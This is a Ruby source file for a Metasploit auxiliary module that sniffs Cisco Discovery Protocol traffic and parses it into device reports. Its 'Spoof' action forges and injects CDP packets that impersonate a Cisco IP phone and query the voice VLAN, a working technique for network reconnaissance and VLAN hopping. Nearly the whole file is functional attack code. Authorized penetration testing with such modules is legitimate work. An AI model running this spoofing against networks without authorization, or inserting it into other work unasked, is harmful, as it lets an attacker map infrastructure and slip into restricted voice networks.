##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Capture

  def initialize
    super(
        'Name'				=> 'CDP Discovery and Spoofing',
        'Description' => 'This module captures and sends Cisco Discovery Protocol packets for discovery',
        'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
        'License'     =>  MSF_LICENSE,
        'Actions'			=>
            [
                [ 'Sniffer' ],
                [ 'Spoof' ]
            ],
        'PassiveActions' =>
            [
                'Sniffer'
            ],
        'DefaultAction' => 'Sniffer'
    )
    register_options(
        [
            OptString.new('SMAC',   [ false, "MAC Address for MAC Spoofing"]),
            OptString.new('VTPDOMAIN',   [ false, "VTP Domain"]),
            OptString.new('DEVICE ID',   [ false, "Device ID (e.g. SIP00070EEA3156,SEP00070EEA3156)", "SEP00070EEA3156"]),
            OptString.new('PORT',   [ false, "The Switch Port", "1"]),
            OptString.new('CAPABILITIES',   [ false, "Capabilities of the device (e.g. Router, Host, Switch)", "Router"]),
            OptString.new('PLATFORM',   [ false, "Platform of the device", "Cisco IP Phone 7975"]),
            OptString.new('SOFTWARE',   [ false, "Software of the device", "SCCP75.9-3-1SR2-1S"]),
            OptBool.new('DUPLEX', [false, 'Duplex', true]),
        ], self.class)
    deregister_options('RHOST')
  end

  def run
    check_pcaprub_loaded # Check first
    lbl=["CDP Version\t","Device Id\t","IP Address\t", "Switch Port\t", "Capabilities" , "Software\t","Platform\t", nil,"Cluster Management", "VTP Domain Management" ,"Native VLAN\t",nil, nil, nil, nil, "VoIP VLAN Query"]
    print_status("Sniffing traffic.....")

    open_pcap

    if(action.name == 'Spoof')
      send_spoof
    end

    each_packet do |pkt|
      p = PacketFu::Packet.parse(pkt)
      if p.proto != ["Eth", "LLDP"] and p.payload =~ /\x01\x00\f\xCC\xCC\xCC/
        pay=p.payload
        pos=30
        cdp=pay[22].getbyte(0)
        report = "CDP Version\t\t: #{cdp}\n"
        if cdp == 2
          while 1
          type = pay[pos-4,2].getbyte(1)
          break if pay[pos-2,2].nil?
          l=pay[pos-2,2].unpack('H*')[0].to_i(16)
          case type
            when 1
              d=pay[pos,l]
              d.chop! if d[-1] == "\n"
              report << "    #{lbl[type]} \t: #{d}\n"
            when 2
              if pay[pos,4].unpack('H*')[0].to_i(16) == 1
                addr=pay[pos+9,4]
                ip=[]
                4.times {|i| ip << "#{addr.getbyte(i)}"}
                report << "    #{lbl[type]}\t: #{ip.join(".")}\n"
              end
            when 3
              report << "    #{lbl[type]}\t: #{pay[pos,l]}\n"
            when 4
              c=pay[pos+3,1].getbyte(0)
              c=c.to_s(2)
              cap={}
              caps=["Repeater\t\t","IGMP Capable\t\t","Host\t\t\t","Switch\t\t","Source Route Bridge\t","Transparent Bridge\t","Router\t\t"]
              report << "    #{lbl[type]}\t: \n"
              c.length.times {|i|
                if c[-1].to_i == 1
                  report << "\t\t\t  #{caps[-1]} : Yes\n"
                else
                  report << "\t\t\t  #{caps[-1]} : No\n"
                end
                c.chop!
                caps.delete_at(-1)
              }
              caps.each {report << "\t\t\t  #{caps[-1]} : No\n"} if caps.length > 0
            when 5
              report << "    #{lbl[type]}\t: #{pay[pos,l].split("\n").join("\n\t\t\t  ")}\n"
            when 8
              #report << "    #{lbl[type]}\t:\n"
              #report << "      IP: #{pay[pos+14,4]}\n"
            when 10
              report << "    #{lbl[type]}\t: #{pay[pos,2].unpack('H*')[0].to_i(16)}\n"
            when 15
              report << "    #{lbl[type]}\t: #{pay[pos+1,2].unpack('H*')[0].to_i(16)}\n"
            else
              report << "    #{lbl[type]}\t: #{pay[pos,l]}\n" if lbl[type] != nil
          end
          if pos > pay.length
            break
          else
            pos = pos+l
          end
          end
        else
          report << "    TTL\t\t\t: #{pay[23].unpack('H*')[0].to_i(16)}"
        end
        print_good("#{report}")
      end
    end
    close_pcap
    print_status("Finished sniffing")
  end
  def send_spoof()
    p=prep_cdp                                              #Preparation of the CDP content
    dst_mac="\x01\x00\f\xCC\xCC\xCC"                        #CDP multicast

    #Source Mac Address Preparation
    @interface = datastore['INTERFACE'] || Pcap.lookupdev
    smac = datastore['SMAC'] || get_mac(@interface)
    raise RuntimeError ,'SMAC should be defined' unless smac
    src_mac=mac_to_bytes(smac)

    #Injecting packet to the network
    l=PacketFu::Inject.new(:iface=>@interface)
    cdplength=["%04X" % (p.length+8).to_s].pack('H*')
    l.array_to_wire(:array=>["#{dst_mac}#{src_mac}#{cdplength}"+llc+p])
  end
  def llc
    llc="\xAA\xAA\x03\x00\x00\f \x00"
    return llc
  end
  def mac_to_bytes(smac)
    return [smac.gsub(":","")].pack('H*')
  end
  def prep_cdp
    #options from the user
    device=datastore['DEVICE ID'] || "SEP00070EEA3156"
    port=datastore['PORT'] || "1"
    capabilities=datastore['CAPABILITIES'] || "Host"
    platform=datastore['PLATFORM'] || "Cisco IP Phone 7975"
    software=datastore['SOFTWARE'] || "SCCP75.9-3-1SR2-1S"
    vtpdomain=datastore['VTPDOMAIN'] if datastore['VTPDOMAIN']
    if datastore['DUPLEX']
      dup=1
    else
      dup=0
    end

    #CAPABILITIES
    #define CDP_CAP_LEVEL1          0x40
    #define CDP_CAP_FORWARD_IGMP    0x20
    #define CDP_CAP_NETWORK_LAYER   0x10
    #define CDP_CAP_LEVEL2_SWITCH   0x08
    #define CDP_CAP_LEVEL2_SRB      0x04
    #define CDP_CAP_LEVEL2_TRBR     0x02
    #define CDP_CAP_LEVEL3_ROUTER   0x01

    #Package Preperation
    p  = "\x00\x01#{l(device)}#{device}"                    # Device ID
    p << "\x00\x03#{l("Port #{port}")}Port #{port}"         # Port ID
    p << "\x00\x04\x00\b\x00\x00\x00A"                      # Capabilities
    p << "\x00\x05#{l(software)}#{software}"                # Software Version
    p << "\x00\x06#{l(platform)}#{platform}"                # Platform
    p << "\x00\x09#{l(vtpdomain)}#{vtpdomain}" if vtpdomain # VTP Domain Management
    p << "\x00\x10\x00\x06\x18\x9C"                         # Power Consumption 6300 mW
    p << "\x00\v\x00\x05#{dup}"                             # Duplex
    p << "\x00\x0F\x00\b \x02\x00\x01"                      # VLAN Query

    #Header Preperation
    version = "\x02"                                        # CDP version
    ttl = "\xB4"                                            # TTL (180 seconds)
    checksum = cdpchecksum(version+ttl+"\x00\x00"+p)        # CDP Checksum

    p=version+ttl+checksum+p                                # CDP Payload

    return p
  end

  def l(s,n=2)
    l=s.length+4
    l="%0#{n*2}X" % l
    b=[l].pack('H*')
    return b
  end

  def cdpchecksum(p)
    num_shorts = p.length / 2
    cs = 0
    c = p.length

    p.unpack("S#{num_shorts}").each { |x|
      cs += x
      c -= 2
    }

    if (c == 1)
      cs += p[p.length - 1].getbyte(0) << 8
    end

    cs = (cs >> 16) + (cs & 0xffff)
    cs = ~((cs >> 16) + cs) & 0xffff
    cs = ([cs].pack("S*")).unpack("n*")[0]

    cs = [ "%02X" % cs ].pack('H*')
    return cs
  end
end
